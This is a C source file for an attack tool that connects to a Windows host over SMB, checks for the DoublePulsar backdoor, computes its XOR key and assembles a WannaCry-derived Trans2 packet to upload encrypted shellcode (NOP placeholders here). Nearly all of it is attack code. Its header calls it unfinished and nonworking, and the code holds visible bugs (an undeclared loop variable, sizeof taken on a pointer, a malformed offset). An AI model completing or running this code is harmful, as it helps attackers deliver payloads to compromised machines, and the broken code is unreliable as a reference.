#define _CRT_SECURE_NO_WARNINGS
/*
WARNING: This code is NOT finished and WILL NOT work as of August 4 2020
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#pragma comment(lib,"wsock32.lib")

unsigned char SmbNegociate[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[] =
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

/* 
unsigned char TreeConnect_AndX_Request[] =
"\x00\x00\x00\x58\xff\x53\x4d\x42\x75\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xff\xfe\x00\x08\x00\x03\x04\xff\x00\x58\x00\x08"
"\x00\x01\x00\x2d\x00\x00\x5c\x00\x5c\x00\x31\x00\x37\x00\x32\x00"
"\x2e\x00\x32\x00\x32\x00\x2e\x00\x35\x00\x2e\x00\x34\x00\x36\x00"
"\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f"
"\x3f\x00";*/

unsigned char SMB_TreeConnectAndX[] =
"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";

unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";

//Fixed Trans2 session setup PING packet.  This should work
unsigned char trans2_request[] = 
"\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
"\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
"\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01"
"\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00";

//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
unsigned char wannacry_Trans2_Request[] = 
"\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
"\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
"\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
"\x00\x0e\x00\x0d\x10\x00"; /* d1 c9 10 17 d9 aa 40 17 d9 da 69 17 ( Example SESSION_SETUP Parameters ) */

unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
{
	return 2 * sig ^ ((((sig >> 16) | sig & 0xFF0000) >> 8) |
		(((sig << 16) | sig & 0xFF00) << 8));
}

void convert_name(char *out, char *name)
{
	unsigned long len;
	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}

unsigned char recvbuff[2048];
int main(int argc, char* argv[])
{
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET    sock;
	DWORD    ret;
	WORD    userid, treeid, processid, multiplexid;

	if (!WSAStartup(MAKEWORD(2, 2), &ws))
	{
		printf("couldn't initialize Windows Sockets!");
		ExitProcess(0);
	}
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock <= 0)
	{
		return 0;
	}
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	printf("Connecting %s\n", argv[1]);
	ret = connect(sock, (struct sockaddr*) & server, sizeof(server));

	//send SMB negociate packet
	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//send Session Setup AndX request
	printf("sending Session_Setup_AndX_Request!\n");
	ret = send(sock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	//copy our returned userID value from the previous packet to the TreeConnect request packet
	userid = *(WORD*)(recvbuff + 0x20);
	
	//Generates a new TreeConnect request with the correct IP address
	//rather than the hard coded one embedded in the TreeConnect string
	unsigned char packet[4096];
	unsigned char *ptr;
	unsigned char tmp[1024];
	unsigned short smblen;
	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
	ptr += sizeof(SMB_TreeConnectAndX) - 1;
	sprintf((char*)tmp, "\\\\%s\\IPC$", argv[1]);
	convert_name((char*)ptr, (char*)tmp);
	smblen = strlen((char*)tmp) * 2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX) - 1 - 3, &smblen, 1);
	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_) - 1);
	ptr += sizeof(SMB_TreeConnectAndX_) - 1;
	smblen = ptr - packet;
	smblen -= 4;
	memcpy(packet + 3, &smblen, 1);

	//update UserID in modified TreeConnect Request
	memcpy(packet + 0x20, (char*)&userid, 2); //update userid

	//send modified TreeConnect request
	send(sock, (char*)packet, ptr - packet, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//copy the treeID from the TreeConnect response
	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid

	//Update treeID, Process ID, UserID, Multiplex ID
	//update Multiplex ID to 65
	memcpy(trans2_request + 28, (char*)&treeid, 2);
	memcpy(trans2_request + 32, (char*)&userid, 2);

	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
	//will return x51 or 81
	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	unsigned char signature[5];
	unsigned int sig;
	//copy SMB signature from recvbuff to local buffer
	signature[0] = recvbuff[18];
	signature[1] = recvbuff[19];
	signature[2] = recvbuff[20];
	signature[3] = recvbuff[21];
	signature[4] = recvbuff[22];
	
	//convert the signature buffer to unsigned integer 
	memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));

	//calculate the XOR key for DoublePulsar
	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
	printf("Calculated XOR KEY:  0x%x\n", XorKey);

	//build buffer with shellcode
	char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90";
	
	//generate the SESSION_SETUP parameters here
	unsigned int TotalSizeOfPayload = sizeof(shellcode) ^ XorKey;
	unsigned int ChunkSize = 4096 ^ XorKey;
	unsigned int OffsetofChunkinPayload = XorKey;

	//allocate memory for encrypted shellcode payload
	unsigned char *encrypted;
	encrypted = (unsigned char*)malloc(4096+1);

	//copy shellcode to encrypted buffer
	memcpy(encrypted,shellcode, sizeof(shellcode));

	//Xor the data buffer with the calculated key
	for(i=0;i<4096;i++)
	{
		encrypted[i] = encrypted[i] ^ XorKey;
        }

	//build packet buffer with 4178 bytes in length
	//82 bytes for the Trans2 Session Setup packet header
	//then 4096 bytes for the SESSION_SETUP data ( encrypted payload )
	//Then fill the packet with 0x00s and XOR it with the calculated key
	unsigned char *big_packet = (unsigned char*)malloc(4178+1);
	memset(big_packet, 0x00, 4178);
	int bp;
	for(bp=0;bp<4178;bp++)
	{
		big_packet[bp] = big_packet[bp]^XorKey;
        }

	//will use for re-sending the computed XOR key in the Trans2 SESSION_SETUP data parameters
	unsigned char CHAR_XOR_KEY[4];

	CHAR_XOR_KEY[0] = XorKey & 0xFF;
	CHAR_XOR_KEY[1] = (XorKey >> 8) & 0xFF;
	CHAR_XOR_KEY[2] = (XorKey >> 8 >> 8) & 0xFF;
	CHAR_XOR_KEY[3] = (XorKey >> 8 >> 8 >> 8) & 0xFF;

	unsigned char TotalSizeOfPayloadCHAR[4];
	unsigned char ChunkSizeCHAR[4];
	unsigned char OffsetofChunkinPayloadCHAR[4];

	TotalSizeOfPayloadCHAR[0] = TotalSizeOfPayload & 0xFF;
	TotalSizeOfPayloadCHAR[1] = (TotalSizeOfPayload >> 8) & 0xFF;
	TotalSizeOfPayloadCHAR[2] = (TotalSizeOfPayload >> 8 >> 8) & 0xFF;
	TotalSizeOfPayloadCHAR[3] = (TotalSizeOfPayload >> 8 >> 8 >> 8) & 0xFF;

	ChunkSizeCHAR[0] = ChunkSize & 0xFF;
	ChunkSizeCHAR[1] = (ChunkSize >> 8) & 0xFF;
	ChunkSizeCHAR[2] = (ChunkSize >> 8 >> 8) & 0xFF;
	ChunkSizeCHAR[3] = (ChunkSize >> 8 >> 8 >> 8) & 0xFF;

	OffsetofChunkinPayloadCHAR[0] = OffsetofChunkinPayload & 0xFF;
	OffsetofChunkinPayloadCHAR[1] = (OffsetofChunkinPayload >> 8) & 0xFF;
	OffsetofChunkinPayloadCHAR[2] = (OffsetofChunkinPayload >> 8 >> 8) & 0xFF;
	OffsetofChunkinPayloadCHAR[3] = (OffsetofChunkinPayload >> 8 >> 8 >> 8) & 0xFF;

	//copy wannacry skeleton packet to big Trans2 packet
	memcpy(big_packet, wannacry_Trans2_Request, sizeof(wannacry_Trans2_Request));

	//copy SESSION_SETUP parameters
	memcpy(big_packet + sizeof(wannacry_Trans2_Request), TotalSizeOfPayloadCHAR,4);
	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 4, ChunkSizeCHAR,4);
	memcpy(big_packet + sizeof(wannacry_Trans2_Request) + 8, OffsetofChunkinPayloadCHAR,4);
	
	//copy encrypted payload
	memcpy(big_packet + wannacry_Trans2_Request + 12, encrypted, 4096);

	//Update treeID, UserID
	memcpy(big_packet + 28, (char*)&treeid, 2);
	memcpy(big_packet + 32, (char*)&userid, 2);
	
  	//send packet
	send(sock, (char*)big_packet, sizeof(big_packet)-1, 0);
	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);

	free(encrypted);
	free(big_packet);

	closesocket(sock);
	WSACleanup();
	return 0;
}
